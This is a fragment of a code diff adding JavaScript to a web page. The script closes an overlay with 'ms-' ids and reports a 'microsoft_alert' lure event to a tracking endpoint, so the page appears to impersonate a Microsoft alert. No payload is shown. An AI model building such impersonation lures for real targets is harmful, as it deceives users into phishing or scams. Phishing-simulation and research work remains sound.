+
+    function closeDialog() {
+      document.getElementById('ms-overlay').classList.remove('visible');
+      const badge = document.getElementById('ms-copy-badge');
+      if (badge) badge.classList.remove('show');
+      fetch('/api/track', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ lure: 'microsoft_alert', event: 'overlay_closed' })
+      }).catch(()=>{});
+    }
+
+    document.getElementById('ms-overlay').addEventListener('click', function(e) {
+      if (e.target === this) closeDialog();
+    });
+  </script>
+</body>
+</html>
